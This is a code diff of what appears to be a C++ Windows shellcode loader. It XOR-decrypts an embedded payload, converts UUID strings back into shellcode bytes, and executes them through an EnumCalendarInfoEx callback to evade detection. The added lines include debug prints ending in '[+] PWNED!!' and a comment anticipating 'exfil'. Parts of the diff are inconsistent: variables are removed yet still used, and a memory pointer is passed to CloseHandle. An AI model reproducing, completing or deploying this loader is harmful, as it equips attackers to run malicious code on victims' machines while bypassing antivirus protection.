@@ -178,14 +178,16 @@ int main(int argc, char *argv[])
         char *mem{(char *)malloc(100000000)};
         if (mem != NULL)
         {
-                memset(mem, 0x0, 100000000);
-                free(mem);
+#if DEBUG
+                printf("Before xor: %s\n\n", payload);
+#endif
 
                 XOR((char *)payload, sizeof(payload), key, sizeof(key));
 
-                int loops{sizeof(payload) / 39};
+#if DEBUG
+                printf("After xor: %s\n\n", payload);
+#endif
 
-                const char k32DllName[13]{ 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
                 HMODULE k32_handle{GetModuleHandle(k32DllName)};
                 BOOL rv{};
                 char chars_array[39]{};
@@ -200,9 +202,10 @@ int main(int argc, char *argv[])
 
                 for (int i{0}; i < loops; i++)
                 {
-                        temp = strtok(payload, "\",\n");
-                        strcpy(chars_array, temp);
-                        printf("substring %s\n", chars_array);
+#if DEBUG
+                        printf("Sub-string: %s\n\n", chars_array);
+#endif
+
                         RPC_CSTR rcp_cstr = (RPC_CSTR)chars_array;
                         RPC_STATUS status = UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID *)hptr);
                         if (status != RPC_S_OK)
@@ -234,6 +237,10 @@ int main(int argc, char *argv[])
                 EnumCalendarInfoEx((CALINFO_ENUMPROCEX)mem, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
                 CloseHandle(mem);
 
+                // should be ready for exfil! but successful code might never reach here! :(
+#if DEBUG
+                printf("[+] PWNED!!\n\t\tYOU'RE IN!\n");
+#endif
                 return 0;
         }
         else
